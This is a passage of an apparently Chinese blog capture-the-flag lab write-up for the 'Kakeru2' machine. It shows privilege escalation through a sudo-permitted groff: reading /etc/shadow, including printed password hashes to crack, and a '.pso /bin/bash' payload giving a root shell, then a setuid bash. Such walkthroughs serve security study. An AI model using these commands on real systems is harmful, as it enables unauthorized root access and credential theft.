+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">guayu<span class="variable">@Kakeru2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> guayu on <span class="symbol">Kakeru2:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> guayu may run the following commands on <span class="symbol">Kakeru2:</span></span><br><span class="line">    (<span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/groff *</span><br></pre></td></tr></table></figure></div>
+<p>第一种方法可以直接用这个工具来读取文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">guayu@Kakeru2:~$ sudo /usr/bin/groff  -man -Tascii /etc/shadow</span><br><span class="line">troff: /etc/shadow:<span class="number">1</span>: warning [p <span class="number">1</span>, <span class="number">0</span>.<span class="number">0</span>i]: cannot adjust line</span><br><span class="line">troff: /etc/shadow:<span class="number">1</span>: warning [p <span class="number">1</span>, <span class="number">0</span>.<span class="number">2</span>i]: cannot adjust line</span><br><span class="line">troff: /etc/shadow:<span class="number">26</span>: warning [p <span class="number">1</span>, <span class="number">2</span>.<span class="number">5</span>i]: cannot adjust line</span><br><span class="line">troff: /etc/shadow:<span class="number">26</span>: warning [p <span class="number">1</span>, <span class="number">2</span>.<span class="number">7</span>i]: cannot adjust line</span><br><span class="line">root:$<span class="number">6</span>$TkJiunDYYH/<span class="number">8</span>ETYb$Rbor5mqOT0O3bOcsMWEzgO2QvN2ttdlkJcM-</span><br><span class="line">GIo5LDi4oxwESo0VsLx3zL0x3eA3L5MTNhyaGl7EUCbDi-</span><br><span class="line">vBgeb/:<span class="number">20242:0</span>:<span class="number">99999:7</span>:::             daemon:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">bin:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::                 sys:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">sync:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::              games:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">man:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::                  lp:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">mail:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::               news:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">uucp:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::   proxy:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::    www-da-</span><br><span class="line">ta:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::               backup:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">list:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::                irc:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">gnats:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::            nobody:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">_apt:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::   systemd-timesync:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">systemd-network:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::                  systemd-re-</span><br><span class="line">solve:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::  systemd-coredump:!!:<span class="number">20166</span>::::::  mes-</span><br><span class="line">sagebus:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::            sshd:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">guayu:$<span class="number">6</span>$TX3nztwWtmEYaSQI$xj7ofvrgPmkM4tQ-</span><br><span class="line">CY8hUV1P905H3yvz3F90KYq/tHUDcD8cCAhT92.vNIRz8Iyu9vLHBmXQY-</span><br><span class="line">BXFC.akO2XKb2/:<span class="number">20241:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>整理一下root的格式然后可以爆破密码</p>
+<p>第二种方式是使用-U执行命令<br>写一个.roff文件 然后用-U执行  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;.pso /bin/bash&#x27;</span> &gt; payload.roff</span><br><span class="line"><span class="built_in">sudo</span> /usr/bin/groff -U payload.roff</span><br></pre></td></tr></table></figure></div>
+<p>.pso会让groff调用外部程序执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">guayu<span class="variable">@Kakeru2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /usr/bin/groff -U payload.roff </span><br><span class="line">root<span class="variable">@Kakeru2</span><span class="symbol">:/home/guayu</span><span class="comment"># chmod +s /bin/bash</span></span><br><span class="line">root<span class="variable">@Kakeru2</span><span class="symbol">:/home/guayu</span><span class="comment"># exit</span></span><br><span class="line">exit</span><br><span class="line">guayu<span class="variable">@Kakeru2</span><span class="symbol">:~</span><span class="variable">$ </span>bash -p</span><br><span class="line">bash<span class="number">-5.0</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">1000</span>(guayu) gid=<span class="number">1000</span>(guayu) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">1000</span>(guayu)</span><br></pre></td></tr></table></figure></div>
+
+<p>当然这个工具可以直接读文件，你要是直接读flag也行 </p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/14848.html" title="群友靶机-Kakeru2 wp">https://guayu-kakeru.github.io/posts/14848.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/19220.html" rel="prev" title="xmu新生赛web wp">
+      <i class="fa fa-chevron-left"></i> xmu新生赛web wp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-text">web</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/14848.html" title="posts&#x2F;14848.html">群友靶机-Kakeru2 wp</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/19220.html" title="posts&#x2F;19220.html">xmu新生赛web wp</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/51954.html" title="posts&#x2F;51954.html">群友靶机-LingMj复盘</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/28847.html" title="posts&#x2F;28847.html">群友靶机-Noport复盘</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/7589.html" title="posts&#x2F;7589.html">SQL注入专题(更新中)</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
